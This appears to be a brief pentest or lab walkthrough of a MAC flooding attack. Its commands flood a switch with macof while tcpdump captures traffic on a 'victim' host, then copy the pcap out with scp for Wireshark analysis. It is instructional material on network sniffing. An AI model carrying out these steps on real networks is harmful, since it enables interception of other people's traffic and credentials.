## Attack Flow

1. **Open Two SSH Sessions**

    Start the SSH session 1 in terminal 1.

    ```sh
    ssh victim@<target-ip>
    ```

    Start the SSH session 2 in terminal 2.

2. **Flood the Switch and Capturing the Traffic**

    In the session 1, start **tcpdump** and keep it running.

    ```sh
    tcpdump -A -i eth1 -w /tmp/tcpdump.pcap
    ```

    In the session 2, start flooding the switch (here "eth1" interface).

    ```sh
    macof -i eth1
    ```

    After about 30 seconds, stop **macof** and **tcpdump**.

3. **Investigate the Captured Traffic**

    In your local machine, transfer the dumped file named "/tmp/tcpdump.pcap" from the target machine to your local machine.

    ```sh
    scp victim@<target-ip>:/tmp/tcpdump.pcap .
    ```

    Investigate this file using Wireshark

    ```sh
    wireshark ./tcpdump.pcap
    ```
